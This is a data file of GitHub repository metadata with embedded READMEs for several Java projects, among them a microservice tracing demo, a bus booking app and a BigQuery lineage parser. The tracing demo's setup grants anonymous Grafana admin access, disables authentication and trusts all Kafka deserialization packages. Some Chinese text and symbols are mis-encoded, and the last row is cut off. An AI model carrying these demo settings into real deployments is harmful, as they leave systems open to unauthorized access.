repo,branch,readme,releases,issues,branches,pulls,headings,top,projects,plugins,pwars,pjars,ppoms
amaseng/myinvois-open-sdk,main,"# myinvois-open-sdk

Open source effort for MyInvois API.

# Disclaimer

While this software is provided under the terms of the Apache License, Version 2.0, it comes with no warranties or guarantees. Users are free to use, modify, and distribute the software according to the terms of the license. However, by using this software, users acknowledge that they do so at their own risk and assume all responsibility for any consequences that may arise from its use.

# Current Status

At the current state support: 

[JVM](jvm/) - Completed, login and validate TIN works, submit document to sandbox with and without signature is working.
",0,0,6,5.0,"['disclaimer', 'current', 'status']","['disclaimer', 'current', 'status']",1.0,[],0.0,1.0,0.0
ErayMert/microservice-log-tracing,main,"
# Microservice micrometer log tracing

I attempted to explain the libraries and some monitoring tools used to trace logs in projects written with a microservices architecture.

## Technologies Used

* Java 17
* Springboot 3
* Feign Client
* Apache Kafka
* Swagger
* H2 Database
* Zipkin
* Grafana
* Mapstruct
* Micrometer

## Architecture Diagram

![architecture](Images/arch.png)

## Running on Your Computer

Clone the project

```bash
https://github.com/ErayMert/microservice-log-tracing.git
```

Navigate to the project directory in the terminal

```bash
  cd microservice-log-tracing
```

* The docker-compose.yml file contains configurations for Kafka, Grafana, Zipkin, Zookeeper, Tempo, and Loki.

```yml
version: '3.8'

services:
  grafana:
    image: grafana/grafana-enterprise:latest
    volumes:
      - ./docker/grafana/datasources.yml:/etc/grafana/provisioning/datasources.yaml
    environment:
      - GF_AUTH_ANONYMOUS_ENABLED=true
      - GF_AUTH_ANONYMOUS_ORG_ROLE=Admin
      - GF_AUTH_DISABLE_LOGIN_FORM=true
    ports:
      - ""3000:3000""

  zipkin:
    image: openzipkin/zipkin:latest
    ports:
      - ""9411:9411""

  zookeeper:
    image: docker.io/bitnami/zookeeper:3.8
    restart: always
    hostname: zookeeper
    container_name: zookeeper
    ports:
      - ""2181:2181""
    environment:
      ZOOKEEPER_CLIENT_PORT: 2181
      ZOOKEEPER_TICK_TIME: 2000
      ALLOW_ANONYMOUS_LOGIN: yes

  kafka:
    image: wurstmeister/kafka
    container_name: kafka
    ports:
      - ""9092:9092""
    environment:
      KAFKA_ADVERTISED_HOST_NAME: localhost
      KAFKA_ZOOKEEPER_CONNECT: zookeeper:2181

  loki:
    image: grafana/loki:main
    command: [ ""-config.file=/etc/loki/local-config.yaml"" ]
    ports:
      - ""3100:3100""

  tempo:
    image: grafana/tempo:2.2.4
    command: [ ""--target=all"", ""--storage.trace.backend=local"", ""--storage.trace.local.path=/var/tempo"", ""--auth.enabled=false"" ]
    ports:
      - ""14250:14250""
      - ""4317:4317""
    depends_on:
      - loki
```

You can start these tools with the following command:

```docker
  docker-compose up -d
```

## Added Libraries

* Brave is a library that enables tracing in distributed systems. Especially useful in complex systems like microservices architectures, it tracks requests passing through gateways, allowing you to see how requests interact with each other and how they are responded to.

```xml
<dependency>
    <groupId>io.micrometer</groupId>
    <artifactId>micrometer-tracing-bridge-brave</artifactId>
</dependency>
```

* This dependency allows for the collection of metrics and monitoring via Micrometer in applications using OpenFeign.

```xml
<dependency>
    <groupId>io.github.openfeign</groupId>
    <artifactId>feign-micrometer</artifactId>
</dependency>
```

* Zipkin is a tracing system and server that provides tracing and debugging capabilities in distributed systems. The zipkin-reporter-brave dependency provides the necessary reporter functionality to send reports to Zipkin via the Brave library, enabling tracing in your application through Zipkin.

```xml
<dependency>
    <groupId>io.zipkin.reporter2</groupId>
    <artifactId>zipkin-reporter-brave</artifactId>
</dependency>
```
* Developed by Grafana Labs. The loki-logback-appender dependency allows for redirecting log messages from Logback to Loki. This enables storing your application's logs in Loki and visualizing them with Grafana.

```xml
<dependency>
    <groupId>com.github.loki4j</groupId>
    <artifactId>loki-logback-appender</artifactId>
    <version>1.3.2</version>
</dependency>
```

## Logback-spring.xml File

* I configured the file as below since I'm tracing logs in Loki datasource in Grafana. This file should be present in every project.
* The label sections correspond to the parts used for searching in Loki.

```xml
<?xml version=""1.0"" encoding=""UTF-8""?>
<configuration>
    <include resource=""org/springframework/boot/logging/logback/base.xml""/>
    <springProperty scope=""context"" name=""appName"" source=""spring.application.name""/>

    <appender name=""LOKI"" class=""com.github.loki4j.logback.Loki4jAppender"">
        <http>
            <url>http://localhost:3100/loki/api/v1/push</url>
        </http>
        <format>
            <label>
                <pattern>app=${appName},host=${HOSTNAME},traceID=%X{traceId:-NONE},level=%level</pattern>
            </label>
            <message>
                <pattern>${FILE_LOG_PATTERN}</pattern>
            </message>
            <sortByTime>true</sortByTime>
        </format>
    </appender>

    <root level=""INFO"">
        <appender-ref ref=""LOKI""/>
    </root>

</configuration>
```

## Configuration in application.yml

* The following setting indicates that all tracing data will be collected. That is, each request is traced and stored with a 100% probability.
``` yml
management:
  tracing:
    sampling:
      probability: 1.0
```
* This setting provides Zipkin configuration and allows Spring Boot 3 to connect to a remote server.
* By default `http://localhost:9411/api/v2/spans`, we don't need to specify the endpoint, but we need to for a standalone server.

``` yml
management:
  zipkin:
    tracing:
      endpoint: ""http://localhost:9411/api/v2/spans""
```
* The following config specifies how the traceId and spanId will be reflected in the output.

``` yml
logging:
  pattern:
    level: ""%5p [${spring.application.name:},%X{traceId:-},%X{spanId:-}]""
```

* The output in the console looks like this: 

![trace_span](Images/trace_span.png)

## Micrometer for Schedule

* You must use version of spring boot above 3.2.0
> https://github.com/spring-projects/spring-boot/issues/36119


## Micrometer Configuration for Kafka

* For the Producer: 
    * Set `kafkaTemplate.setMicrometerEnabled(true);`
    * Set `kafkaTemplate.setObservationEnabled(true);`
  
```java
@RequiredArgsConstructor
@Configuration
public class ProducerConfiguration {

    private final KafkaProperties kafkaProperties;

    @Bean
    public ProducerFactory<String, Object> producerFactory() {
        Map<String, Object> configProps = new HashMap<>();
        configProps.put(ProducerConfig.BOOTSTRAP_SERVERS_CONFIG, kafkaProperties.getAddress());
        configProps.put(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG, StringSerializer.class);
        configProps.put(ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG, JsonSerializer.class);
        
        return new DefaultKafkaProducerFactory<>(configProps);
    }

    @Bean
    public KafkaTemplate<String, Object> kafkaTemplate() {

        KafkaTemplate<String, Object> kafkaTemplate = new KafkaTemplate<>(producerFactory());
        kafkaTemplate.setMicrometerEnabled(true);
        kafkaTemplate.setObservationEnabled(true);

        return kafkaTemplate;
    }
}
```

* For the Consumer:
    * Set `factory.getContainerProperties().setObservationEnabled(true);`
    * Set `factory.getContainerProperties().setMicrometerEnabled(true);`
    * Set `factory.getContainerProperties().setLogContainerConfig(true);` // Not required
    * Set `factory.getContainerProperties().setCommitLogLevel(LogIfLevelEnabled.Level.INFO);`  // Not required

```java
@Slf4j
@RequiredArgsConstructor
@Configuration
public class KafkaConsumerConfiguration {

    private final KafkaProperties kafkaProperties;

    @Bean
    public KafkaListenerContainerFactory<ConcurrentMessageListenerContainer<String, Object>> kafkaListenerContainerFactory() {
        ConcurrentKafkaListenerContainerFactory<String, Object> factory =
                new ConcurrentKafkaListenerContainerFactory<>();

        factory.getContainerProperties().setObservationEnabled(true);
        factory.getContainerProperties().setMicrometerEnabled(true);
        factory.getContainerProperties().setLogContainerConfig(true); 
        factory.getContainerProperties().setCommitLogLevel(LogIfLevelEnabled.Level.INFO);
        factory.setConsumerFactory(new DefaultKafkaConsumerFactory<>(consumerConfigs()));
        return factory;
    }

    @Bean
    public Map<String, Object> consumerConfigs() {
        Map<String, Object> props = new HashMap<>();
        props.put(ConsumerConfig.BOOTSTRAP_SERVERS_CONFIG, kafkaProperties.getAddress());
        props.put(ConsumerConfig.KEY_DESERIALIZER_CLASS_CONFIG, StringDeserializer.class);
        props.put(ConsumerConfig.VALUE_DESERIALIZER_CLASS_CONFIG, JsonDeserializer.class);
        props.put(ConsumerConfig.GROUP_ID_CONFIG, kafkaProperties.getGroupId());
        props.put(ConsumerConfig.AUTO_OFFSET_RESET_CONFIG, ""latest"");
        props.put(JsonDeserializer.TRUSTED_PACKAGES, ""*"");
        return props;
    }

}
```

## Micrometer Configuration for Async

* By design you can only have one AsyncConfigurer, thus only one executor pool is

```java
import io.micrometer.context.ContextExecutorService;
import io.micrometer.context.ContextSnapshot;
import java.util.concurrent.Executor;
import lombok.RequiredArgsConstructor;
import org.springframework.beans.factory.annotation.Qualifier;
import org.springframework.context.annotation.Configuration;
import org.springframework.scheduling.annotation.AsyncConfigurer;
import org.springframework.scheduling.concurrent.ThreadPoolTaskExecutor;

@Configuration(proxyBeanMethods = false)
@RequiredArgsConstructor
public class AsyncTraceContextConfig implements AsyncConfigurer {

  // NOTE: By design you can only have one AsyncConfigurer, thus only one executor pool is
  // configurable.
  @Qualifier(""taskExecutor"") // if you have more than one task executor pools
  private final ThreadPoolTaskExecutor taskExecutor;

  @Override
  public Executor getAsyncExecutor() {
    return ContextExecutorService.wrap(
            taskExecutor.getThreadPoolExecutor(),
                    ContextSnapshotFactory.builder().build()::captureAll);
  }
}
```
* If you have more than one executor pools and wants to add tracing to all, use the TaskDecorator with ContextSnapshot.wrap():

```java
import io.micrometer.context.ContextSnapshot;
import java.util.concurrent.Executor;
import org.springframework.boot.task.TaskExecutorBuilder;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.core.task.TaskDecorator;

@Configuration
public class AsyncConfig {
  @Bean
  public TaskDecorator otelTaskDecorator() {
    return runnable -> ContextSnapshotFactory.builder().build()
                                      .captureAll((new Object[0])).wrap(runnable);
  }

  @Bean(""asyncExecutorPool1"")
  public Executor asyncExecutorPool1(TaskDecorator otelTaskDecorator) {
    return new TaskExecutorBuilder()
        .corePoolSize(5)
        .maxPoolSize(10)
        .queueCapacity(10)
        .threadNamePrefix(""threadPoolExecutor1-"")
        .taskDecorator(otelTaskDecorator)
        .build();
  }

  @Bean(""asyncExecutorPool2"")
  public Executor asyncExecutorPool2(TaskDecorator otelTaskDecorator) {
    return new TaskExecutorBuilder()
        .corePoolSize(5)
        .maxPoolSize(10)
        .queueCapacity(10)
        .threadNamePrefix(""threadPoolExecutor2-"")
        .taskDecorator(otelTaskDecorator)
        .build();
  }
}
```
## Trying it out on the Application

* First, let's create a customer and a product using Swagger.

![create_customer](Images/create_customer.png)
![create_product](Images/product_create.png)

* Then, the customer will create an order, and the customer service will communicate with the order service via Kafka to create an order.
![create_order](Images/create_order.png)

### Log Tracing with Grafana

* Connect to Grafana using the address <http://localhost:3000>
* The configuration of logback-spring.xml on Loki datasource in Grafana looks like this:

![loki label](Images/loki_label.png)

* Let's observe the order creation we tried above on Grafana.
  * First, we'll obtain a traceId from the customer service, and then we'll search on Loki using this traceId to observe all logs associated with this traceId.

![create_order_log](Images/create_order_log.png)
  * Let's search with the traceId we obtained, and we'll see all service logs associated with this traceId.

![create_order_trace_log](Images/grafana_trace_log.png)

### Log Tracing with Zipkin
* To connect to Zipkin, use the address <http://localhost:9411>

* If we observe the order creation request on Zipkin, we'll see output like this:

![zipkin_trace_log](Images/zipkin_trace_log.png)


### Happy coding, and may your microservices journey be filled with successful deployments and seamless operations!""









  
",0,0,1,0.0,"['microservice', 'micrometer', 'log', 'trace', 'technology', 'use', 'architecture', 'diagram', 'run', 'your', 'computer', 'added', 'library', 'file', 'configuration', 'micrometer', 'schedule', 'micrometer', 'configuration', 'kafka', 'micrometer', 'configuration', 'async', 'try', 'application', 'log', 'tracing', 'grafana', 'log', 'tracing', 'zipkin', 'happy', 'coding', 'may', 'microservices', 'journey', 'fill', 'successful', 'deployment', 'seamless', 'operation']","['micrometer', 'log', 'configuration', 'tracing', 'microservice']",4.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,4.0,0.0
C0de-cake/airbnb-clone-backend,main,"# Airbnb clone (fullstack project) Spring boot 3, Angular 17, PrimeNG, PostgreSQL, Auth0 (2024) (Backend)

Spring boot backend of the airbnb clone

[Video tutorial](https://youtu.be/XriUV06Hkow)

[Angular Frontend](https://github.com/C0de-cake/airbnb-clone-frontend)

### Key Features:
- ğŸ“… Booking management for travelers
- ğŸ  Landlord reservation management
- ğŸ” Search for houses by criteria (location, date, guests, beds, etc)
- ğŸ” Authentication and Authorization (Role management) with Auth0 (OAuth2)
- ğŸ¢ Domain-driven design

## Usage
### Prerequisites
- [JDK 21](https://adoptium.net/temurin/releases/)
- [PostgreSQL](https://www.postgresql.org/download/)
- IDE ([VSCode](https://code.visualstudio.com/download), [IntelliJ](https://www.jetbrains.com/idea/download/))

### Clone the repository
``git clone https://github.com/C0de-cake/airbnb-clone-back``

### Launch
#### Maven
``./mvnw spring-boot:run  -Dspring-boot.run.arguments=""--AUTH0_CLIENT_ID=<client-id> --AUTH0_CLIENT_SECRET=<client-secret>""``

#### IntelliJ
Go in IntelliJ add the environment variables and then run it.
",0,0,2,0.0,"['airbnb', 'clone', 'fullstack', 'project', 'spring', 'boot', 'angular', 'primeng', 'postgresql', 'backend', 'key', 'feature', 'usage', 'prerequisite', 'clone', 'repository', 'launch', 'maven', 'intellij']","['clone', 'airbnb', 'fullstack', 'project', 'spring']",1.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,1.0,0.0
SearchScale/lucene-cuvs,main,"# Lucene CuVS Integration

This is an integration for [CuVS](https://github.com/rapidsai/cuvs), GPU accelerated vector search library from NVIDIA (formerly part of [Raft](https://github.com/rapidsai/raft)), into [Apache Lucene](https://github.com/apache/lucene).

## Architecture

As an initial integration, the CuVS library is plugged in as a new KnnVectorFormat via a custom codec.

![Architecture](lucene-cuvs-architecture.png ""Lucene CuVS Architecture"")

By way of a working example, Wikipedia corpus (1.3M documents) can be indexed, each document having a content vector. Queries (questions.vec.txt) can be executed after the indexing.

> :warning: This is not production ready yet.

## Running

Install NVIDIA drivers, CUDA 12.3+, Maven 3.9.6+ and JDK 21.

    # 1.3 Million wikipedia documents with vector embeddings, along with some query embeddings
    wget -c https://accounts.searchscale.com/wikipedia_vector_dump.csv.gz
    wget -c https://accounts.searchscale.com/questions.vec.txt
    wget -c https://accounts.searchscale.com/questions.raw.txt

    mvn org.apache.maven.plugins:maven-install-plugin:2.5.2:install-file -Dfile=cuvs-searcher-cuda-0.1.jar
    mvn package

    java -cp lucene/target/cuvs-searcher-lucene-0.0.1-SNAPSHOT.jar:cuvs-searcher-cuda-0.1.jar com.searchscale.lucene.vectorsearch.benchmarks.LuceneVectorSearchExample <dump_file> <vector_column_number> <vector_column_name> <number_of_documents_to_index> <vector_dimension> <query_file> <commit_at_number_of_documents> <topK> <no. of HNSW indexing threads> <no. of cuvs indexing threads> <merge_strategy options: NO_MERGE | TRIVIAL_MERGE | NON_TRIVIAL_MERGE> <queryThreads> <hnswMaxConn> <hnswBeamWidth> <hnswVisitedLimit> <cagraIntermediateGraphDegree> <cagraGraphDegree> <cagraITopK> <cagraSearchWidth>

    Example:
    java -Xmx32G -cp lucene/target/cuvs-searcher-lucene-0.0.1-SNAPSHOT.jar:cuvs-searcher-cuda-0.1.jar com.searchscale.lucene.vectorsearch.benchmarks.LuceneVectorSearchExample wikipedia_vector_dump.csv.gz 3 article_vector 12000000 768 query.txt 300000 10 32 32 NO_MERGE 1 16 100 10 128 64 5 1

    (Outputs will be available in benchmarks-results.json and neighbors.csv)

## Contributors

* Vivek Narang, SearchScale
* Ishan Chattopadhyaya, SearchScale & Committer, Apache Lucene & Solr
* Corey Nolet, NVIDIA
* Puneet Ahuja, SearchScale
* Kishore Angani, SearchScale
* Noble Paul, SearchScale & Committer, Apache Lucene & Solr
",0,0,5,7.0,"['lucene', 'cuvs', 'integration', 'architecture', 'run', 'million', 'wikipedia', 'document', 'vector', 'embeddings', 'along', 'query', 'embeddings', 'contributor']","['embeddings', 'lucene', 'cuvs', 'integration', 'architecture']",3.0,"[com.googlecode.cmake-maven-project:cmake-maven-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.codehaus.mojo:build-helper-maven-plugin]",0.0,2.0,1.0
ENATION-UK/page-builder,main,"# image to code

## Introduction
PageBuilder can generate Html pages with the help of AI
- Text to page: Analyzes customer requirements based on the demand text and generates pages.
- Image to page: Converts images into pages.
It uses GPT-4 Vision to generate code.
## Demo

![demo](demo.mp4.gif)

## Usage
### Online Experience

[http://image2code.itbuilder.cn:7008/text2page](http://image2code.itbuilder.cn:7008/text2page)

### Run Locally
```shell
mvn install
java -jar target/page-builder-1.0.0.jar
```
Visit
```
http://localhost:8080/text2page
```
### Set up OpenAI API key

![setting.png](setting.png)

Click settings to configure the OpenAI API key.
 **The API key needs to have access to GPT-4** 

### Upload Image
![upload.png](upload.png)
After uploading the image, GPT's Vision will recognize the image and generate code.",1,0,1,0.0,"['image', 'code', 'introduction', 'demo', 'usage', 'online', 'experience', 'run', 'locally', 'set', 'openai', 'api', 'key', 'upload', 'image']","['image', 'code', 'introduction', 'demo', 'usage']",1.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,1.0,0.0
dee-coder01/BusBuddy,main,"# BusBuddy

BusBuddy is a Spring Boot application designed to manage and facilitate bus transit services.

# Features

1. User authentication and authorization
2. Bus route management
3. Scheduling and real-time tracking
4. Booking and ticketing system
5. Admin dashboard for managing routes and schedules

# API Endpoints

### AdminController

| Endpoint        | Method |    Description    | Access |
| :-------------- | :----: | :---------------: | :----: |
| `/admin/signup` |  POST  | Register as admin | Public |
| `/user/signup`  |  POST  |   User sign up    | Public |

### AdminController

| Endpoint        | Method |    Description    | Access |
| :-------------- | :----: | :---------------: | :----: |
| `/admin/login`  |  POST  | Register as admin | Admin  |
| `/admin/logout` |  POST  | Register as admin | Admin  |

### AdminBusController

| Endpoint        | Method | Description  | Access |
| :-------------- | :----: | :----------: | :----: |
| `/admin/bus`    |  POST  | Add new bus  | Admin  |
| `/admin/logout` |  POST  | Admin logout | Public |

### BusController

| Endpoint              | Method |      Description      | Access |
| :-------------------- | :----: | :-------------------: | :----: |
| `/bus/admin`          |  POST  |      Add new bus      | Admin  |
| `/bus/admin`          |  PUT   |  Update bus details   | Admin  |
| `/bus/admin/{busId}`  | DELETE |      Delete bus       | Admin  |
| `/bus/all`            |  GET   |     Get all buses     | Public |
| `/bus/all/{busId}`    |  GET   | Get bus details by ID | Public |
| `/bus/type/{busType}` |  GET   |   Get buses by type   | Public |

### ReservationController

| Endpoint            | Method |    Description     |    Access     |
| :------------------ | :----: | :----------------: | :-----------: |
| `/user/reservation` |  POST  |  Add reservation   | Authenticated |
| `/user/reservation` | DELETE | Cancel reservation | Authenticated |

### RouteController

| Endpoint       | Method |                Description                | Access |
| :------------- | :----: | :---------------------------------------: | :----: |
| `/route/admin` |  POST  |               Add new route               | Admin  |
| `/route/all`   |  GET   | Get all routes from source to destination | Public |

### UserController

| Endpoint       | Method | Description |    Access     |
| :------------- | :----: | :---------: | :-----------: |
| `/user/login`  |  POST  | User login  |    Public     |
| `/user/logout` |  GET   | User logout | Authenticated |

# Project Structure

```
BusBuddy/
â”œâ”€â”€ .mvn/
â”‚   â””â”€â”€ wrapper/
â”œâ”€â”€ src/
â”‚   â”œâ”€â”€ main/
â”‚   â”‚   â”œâ”€â”€ java/
â”‚   â”‚   â”‚   â””â”€â”€ com/
â”‚   â”‚   â”‚       â””â”€â”€ busbuddy/
â”‚   â”‚   â””â”€â”€ resources/
â”‚   â””â”€â”€ test/
â”‚       â”œâ”€â”€ java/
â”‚       â””â”€â”€ resources/
â”œâ”€â”€ .gitignore
â”œâ”€â”€ mvnw
â”œâ”€â”€ mvnw.cmd
â”œâ”€â”€ pom.xml
â””â”€â”€ README.md
```

# Getting Started

## Prerequisites

Java 17 or higher

## Installation

Clone the repository:

```
git clone https://github.com/dee-coder01/BusBuddy.git
```

## Navigate to the project directory:

```
cd BusBuddy
```

## Build the project:

```
mvn clean install
```

## Running the Application

Run the Spring Boot application:

```
mvn spring-boot:run
```

## Access the application at:

```
http://localhost:8080
```

## Contributing

1. Fork the repository
2. Create a new branch

```
git checkout -b feature-name
```

3. Commit your changes

```
git commit -m ""Add some feature""
```

4. Push to the branch

```
git push origin feature-name
```

5. Create a new Pull Request
",0,0,11,17.0,"['busbuddy', 'feature', 'api', 'endpoint', 'admincontroller', 'admincontroller', 'adminbuscontroller', 'buscontroller', 'reservationcontroller', 'routecontroller', 'usercontroller', 'project', 'structure', 'get', 'start', 'prerequisite', 'installation', 'navigate', 'project', 'directory', 'build', 'project', 'run', 'application', 'access', 'application', 'at', 'contribute']","['project', 'admincontroller', 'application', 'busbuddy', 'feature']",1.0,[org.springframework.boot:spring-boot-maven-plugin],0.0,1.0,0.0
ax1sX/RouteCheck-Alpha,master,"2023å¹´åˆæˆ‘å’Œ@suizhiboå®Œæˆäº†RouteCheckçš„é›å½¢ï¼Œç›®çš„æ˜¯ç”¨äºåˆ†æå’Œæå–æºç ä¸­æ‰€æœ‰çš„è®¿é—®è·¯ç”±ã€‚

ç£¨ç£¨å”§å”§ä¸€ç›´æ²¡æ”¹å®Œï¼Œå…ˆå‘å¸ƒäº†ä¸€ç‰ˆé€‚åˆæ‰«å›½å†…javaæºç çš„ã€‚è¿™ä¸ªç‰ˆæœ¬çš„é™åˆ¶æ˜¯è¦æ±‚æºç ä¸­é‡‡ç”¨çš„æ˜¯åŒ…å«`/WEB-INF/`çš„ç›®å½•æ ¼å¼ã€‚

ç°åœ¨ä½¿ç”¨è¿˜æ˜¯éœ€è¦ä¼ é€’ä¸ª`-sp`å‚æ•°ï¼Œæ¥åŒ…å«`settings.yaml`çš„è·¯å¾„ã€‚è¿™ä¸ªåœ¨åç»­çš„ç‰ˆæœ¬ä¸­ä¼šåˆå¹¶åˆ°jarä¸­ã€‚
è¯¥é…ç½®æ–‡ä»¶ä¸»è¦ç”¨æ¥å®šä¹‰éœ€è¦ç”¨åˆ°çš„åˆ†æå™¨ã€è·¯ç”±çš„è¾“å‡ºä½ç½®å’Œæ ¼å¼ã€‚
```
factAnalyzers:
  default: [ApacheCXFFactAnalyzer, ApacheWinkFactAnalyzer, GuiceServletFactAnalyzer,
            JerseyFactAnalyzer, RESTEasyFactAnalyzer, RestletFactAnalyzer, JAXRSFactAnalyzer,
            SpringBeanFactAnalyzer,SpringMVCAnnotationFactAnalyzer,
            StrutsXmlFactAnalyzer, WSDDFactAnalyzer, WSDLFactAnalyzer, WebXmlFactAnalyzer, SOAPUnionFactAnalyzer,
            StrutsActionFactAnalyzer, HttpServletFactAnalyzer,
            UnionWebServiceFactAnalyzer, UnionServletFactAnalyzer]
outPutDirectory: ./output
tempDirectory: ./output
reportType: all
```

# Usage

```text
.______        ______    __    __  .___________. _______   ______  __    __   _______   ______  __  ___ 
|   _  \      /  __  \  |  |  |  | |           ||   ____| /      ||  |  |  | |   ____| /      ||  |/  / 
|  |_)  |    |  |  |  | |  |  |  | `---|  |----`|  |__   |  ,----'|  |__|  | |  |__   |  ,----'|  '  /  
|      /     |  |  |  | |  |  |  |     |  |     |   __|  |  |     |   __   | |   __|  |  |     |    <   
|  |\  \----.|  `--'  | |  `--'  |     |  |     |  |____ |  `----.|  |  |  | |  |____ |  `----.|  .  \  
| _| `._____| \______/   \______/      |__|     |_______| \______||__|  |__| |_______| \______||__|\__\ 
                                                                                                        
usage: java -jar RouteCheck.jar [-cp <arg>] [-h] [-lp <arg>] [-o <arg>] [-pn
       <arg>] [-pp <arg>] [-sp <arg>]
 -cp,--class-path <arg>     ç±»æ–‡ä»¶åœ°å€
 -h,--help                  æ‰“å°å‘½ä»¤è¡Œå¸®åŠ©ä¿¡æ¯
 -lp,--lib-path <arg>       åº“æ–‡ä»¶åœ°å€
 -o,--outPut <arg>          ç»“æœä¿å­˜ç›®å½•
 -pn,--project-name <arg>   é¡¹ç›®åç§°
 -pp,--project-path <arg>   é¡¹ç›®è·¯å¾„
 -sp,--setting-path <arg>   è®¾ç½®æ–‡ä»¶åœ°å€
```
Default Usage
```text
 java -jar RouteCheck.jar -pp /Users/axisx/Download/project -sp /Users/axisx/Download/settings.yaml
```
Only `-pp` parameter is mandatory, All other parameters are optional. If `-lp` or `-cp` parameter is not specified, RouteCheck will automatically extract it from the project.


RouteCheck supports two output formats: HTML and JSON.

HTML
![htmlç¤ºä¾‹å›¾ç‰‡](./img/img.png)

JSON
![jsonç¤ºä¾‹å›¾ç‰‡](./img/json.png)

",1,1,2,0.0,['usage'],['usage'],1.0,[],0.0,1.0,0.0
borjavb/bq-lineage-tool,master,"# Bq-Lineage-tool


Bq-lineage tool is a column level lineage parser for BigQuery using ZetaSQL. This 
parser started as a fork of this [project by google](https://github.com/GoogleCloudPlatform/bigquery-data-lineage), but it
has been heavily modified to cover the whole bigquery syntax offered by ZetaSQL. The
output of this parser is a DAG of the columns used in a query from sources to outputs, including
auxiliary fields that could be used as part of filters or other operations that don't result in the
materialisation of a field. 



From any arbitrary BigQuery query, you will get the following outputs:
- `output_columns`: The columns that are part of the output of the query, with all the input 
  columns references that were needed to produce them.
- `joins`: List of joins used in the query, considering the columns used for the join
- `aggregations`: List of columns used for aggregations
- `filters`: List of columns used for filtering
- `other_used_columns`: Any other columns used across the query, like order by
- `selected_tables`: A list of all the tables that were selected in the query.
- `Type`: The type of sql statement `{SELECT, CREATE_VIEW, MERGE...}`

![image](./flow.png)


## What can this parser do?

* It's schema aware. This means that a query like `SELECT * FROM table` will generate a DAG
  with all the output columns of `table`, and not just a single node with a `*` symbol.
* It prunes unused columns. This means that for a query like `WITH base AS (SELECT * FROM
  table) SELECT aColumn FROM base` the output DAG will only contain the column `aColumn` and not the
  whole input table.
* It covers pretty much all the BigQuery syntax, including:
    * `WITH` (CTE) clauses
    * Subqueries
    * `UNNEST`-based `JOINS`
    * `STRUCTS` and `ARRAYS`
    * `JOINS`
    * Analytical functions (`QUALIFY`, `LAG`/`LEAD`, `WINDOWS` etc.)
    * Map aliases to original columns
    * `JSON` functions
    * Access to the `PATH` used in `JSON` functions (`JSON_EXTRACT(field,""$.path.to.field"")`)
    * Access to the literals used in the query, for example, in a `WHERE` clause
    * Access to fields that are not part of the output columns of the table (fields only used in a
      `WHERE` clause)
    * `PIVOT` and `UNPIVOT` transformations
    * `GROUP BY GROUPING SETS`, `ROLLUP` and `CUBE`
    * `UDF` and temporary functions
    * Usage of parameters @param
    * Recursive CTEs
    * It parses `SELECTS`, `CREATE {VIEWS}` and `MERGE` statements
    * It automatically infers internal BQ fields like `_TABLE_SUFFIX`

## What can't it do?

* This parser won't work with procedural SQL. For example, it will fail trying to parse a 
  DECLARE or SET operations.
* This parser won't read the logic within UDF functions. It only checks inputs and outputs.
* ZetaSQL might not be up-to-date with the latest BigQuery features, so if there's something
  super new, it will involve either waiting for ZetaSQL to be updated, or going deep into
  ZetaSQL to build the feature.
* It doesn't work while trying to parse queries accessing `INFORMATION_SCHEMA`-type of tables. I
  guess we could bypass this by using a different type of access, but never when through it deeply.
* This parser won't build the DAG of multiple queries. It only parses a single query at a
  time. To build a full dag of your dbt project, for example, you can use libraries like
  `networkx` to connect the edges from the output of this parser.
* Parse SQL syntax that is not supported by ZetaSQL (for example the + operator in Snowflake joins)
* When doing a `SELECT count(*) FROM table`, the output of the parser would act as if no columns
  were selected. This could be subject to interpretation: should all the columns of the input
  `table` be marked as used? Or should the output be an empty list because this query doesn't
  care about any specific column or number of columns?
* Unexpected bugs - even though this parser has been texted over more than 7000 SQL queries, 
  there still might be some edge cases that suddenly are not covered. SQL is hard.
* It doesn't work with `TVF` (Table Valued Functions) - although ZetaSQL parses it, the output 
  won't show the columns of the TVF.
* Automatically infer UDFs - they have to be defined as part of the script that is going to be parsed.

## How to use
The folder `/src/test/examples` has multiple examples of how to use this parser. The main caveat 
relies on how to build the catalog that ZetaSQL needs. Depending on how much you want the parser 
to automate the whole process for you, there are three different methods to build a catalog, 
from the ""let the parser to it for me"" to ""I'll build the catalog myself""

- `/src/test/examples/BigQuerySqlParserBQSchemaTest.java` shows how to rely on the metadata of 
  BiGQuery to build the catalog. To use this method the user has to be authenticated with gcloud.
  Note that there's zero data access/movement in this operation. The only access that is being 
  done is directly to the metadata of the tables, and only to the tables that are being used in 
  the parsed query, i.e., this parser won't scan the whole database. The access is done using 
  the bigquery API. You can use  `gcloud auth application-default login` to authenticate. 
- `/src/test/examples/BigQuerySqlParserLocalSchemaTest.java` shows how to use local json files 
  to build the schema. `/src/test/resources/schemas/` has examples of these files. They are 
  exact copies of the metadata information you can get 
[through the API](https://cloud.google.com/bigquery/docs/reference/rest/v2/tables). Note that 
  this is basically what we automate with the previous method.
- `/src/test/examples/ASTExplorerTest.java` Shows an example on how can manually create your own 
  catalog using ZetaSQL methods/constructors and feed it into the parser. 

### Example
The following example uses the first method to build the catalog -  it will use the bigquery API 
to request the metadata of the tables used in the query.
```java
    BigQueryZetaSqlSchemaLoader schemaLoader =
        new BigQueryZetaSqlSchemaLoader(
            BigQueryTableLoadService.usingServiceFactory(
                BigQueryServiceFactory.defaultFactory()
          )
        );

    ZetaSQLResolver parser = new ZetaSQLResolver(schemaLoader);
    
    String sql = """"""
        SELECT
              word,
              SUM(word_count) AS count
            FROM
              `bigquery-public-data.samples.shakespeare`
            WHERE
              word LIKE ""%raisin%""
            GROUP BY
              word;
        """""";
    
    ResolvedNodeExtended table = parser.extractLineage(sql);
    OutputLineage printer = new OutputLineage();
    printer.toYaml(table, ""test"", true);
```
Output:
```
name: ""test""
output_columns:
- name: ""word""
  references:
  - project_name: ""bigquery-public-data.samples.shakespeare""
    column_name: ""word""
- name: ""count""
  references:
  - project_name: ""bigquery-public-data.samples.shakespeare""
    column_name: ""word_count""
other_used_columns:
- name: ""_word_""
  references:
  - project_name: ""bigquery-public-data.samples.shakespeare""
    column_name: ""word""
    literal_value:
    - ""%raisin%""
type: ""select""
selected_tables:
